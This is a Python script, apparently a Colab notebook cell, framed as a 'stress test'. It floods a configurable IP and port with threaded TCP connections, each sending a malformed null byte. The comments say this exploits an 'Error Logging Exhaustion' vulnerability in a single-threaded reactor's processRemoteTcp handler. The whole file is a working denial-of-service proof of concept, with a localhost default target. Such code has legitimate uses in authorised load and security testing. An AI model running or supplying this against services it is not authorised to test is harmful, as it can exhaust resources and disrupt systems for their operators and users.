import socket
import threading
import time
import sys

# --- Configuration (Google Colab Inputs) ---
# @markdown ### Target Configuration
TARGET_IP = "127.0.0.1" # @param {type:"string"}
TARGET_PORT = 30021 # @param {type:"integer"}

# @markdown ### Stress Test Parameters
THREAD_COUNT = 50 # @param {type:"slider", min:10, max:500, step:10}
DURATION_SECONDS = 60 # @param {type:"integer"}

# --- Global State ---
total_requests = 0
running = True
lock = threading.Lock()

def stress_worker():
    """
    Worker thread that repeatedly connects and sends minimal/malformed
    TCP payloads to trigger the specific 'processRemoteTcp' error handling path.
    """
    global total_requests
    while running:
        try:
            # Standard TCP Connect (Handshake)
            # This triggers the accept() logic in the Single-Threaded Reactor
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((TARGET_IP, TARGET_PORT))

            # Send Minimal Malformed Payload (\x00)
            # This triggers readTcpData() -> processRemoteTcp() -> Error Logging overhead
            # validating the "Error Logging Exhaustion" vulnerability.
            s.send(b'\x00')

            # Increment counter safely
            with lock:
                total_requests += 1

            s.close()
        except Exception:
            # Connection errors are expected during stress testing
            pass

def monitor_loop():
    """
    Monitors and prints the Requests Per Second (RPS) rate.
    """
    global total_requests
    print(f"Starting TCP-PPS Stress Test against {TARGET_IP}:{TARGET_PORT}...")
    print(f"Threads: {THREAD_COUNT} | Duration: {DURATION_SECONDS}s")
    print("-" * 50)

    start_time = time.time()
    last_count = 0

    while running:
        time.sleep(1)
        current_time = time.time()
        elapsed = current_time - start_time

        if elapsed > DURATION_SECONDS:
            break

        with lock:
            current_count = total_requests

        rps = current_count - last_count
        last_count = current_count

        print(f"Time: {int(elapsed)}s | RPS (Connections/s): {rps} | Total: {current_count}")

def main():
    global running

    # Validation
    if TARGET_IP == "127.0.0.1":
        print("WARNING: Target IP is set to localhost. Ensure this is intentional.")

    # Start Worker Threads
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=stress_worker)
        t.daemon = True # Daemon threads exit when main exits
        t.start()
        threads.append(t)

    # Start Monitor Loop (Blocking)
    try:
        monitor_loop()
    except KeyboardInterrupt:
        print("\nTest interrupted by user.")
    finally:
        running = False
        print("-" * 50)
        print(f"Test Completed. Total TCP Connections Attempted: {total_requests}")

if __name__ == "__main__":
    main()
